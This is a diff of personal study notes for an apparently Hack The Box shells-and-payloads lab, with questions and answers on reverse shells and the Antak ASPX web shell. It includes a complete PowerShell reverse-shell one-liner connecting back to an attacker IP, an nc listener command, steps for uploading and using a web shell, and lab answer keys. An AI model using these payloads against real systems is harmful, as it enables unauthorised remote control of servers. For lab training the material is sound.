@@ -48,7 +48,7 @@ run pwnbox
 
 We can run listener (nc) and the target will initiate the connection to us...
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Questions
 
@@ -62,7 +62,7 @@ We can run listener (nc) and the target will initiate the connection to us...
 
 `sudo nc -nlvp 443`
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.46',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
 
@@ -262,6 +262,52 @@ move to URL -> `status.inlanefreight.local\files\demo.aspx`
 
 ### Antak
 
+Similar usage as Landanum, but for .NET framework (aspx)
 
+#### ASPX
+
+* Active Server Page Extended&#x20;
+* written for Microsofts ASP.NET Framework
+* web form pages can be generated for users to input data...
+* on the server side, info is converted into HTML
+* Windows OS...
+
+
+
+#### Questions
+
+1. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)
+
+<mark style="color:red;">**/usr/share/nishang/Antak-WebShell/antak.aspx**</mark>
+
+2. Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: \*\***\***\*, 1 space)
+
+`cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/zihuatanejo/Upload.aspx`
+
+modify shell for use:
+
+* username:password ... htb-student:htb-student
+
+go to URL -> [http://status.inlanefreight.local//files/Upload.aspx](http://status.inlanefreight.local/files/Upload.aspx)
+
+* htb-student:htb-student
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+`whoami`
+
+<mark style="color:red;">**iis apppool\status**</mark>
 
 ### PHP
+
+* Hypertext preprocessor (PHP)
+* scripting language - part of web stack
+* PHP is used by 78% websites
+
+#### Questions
+
+In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../... )
+
+
+
+Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)
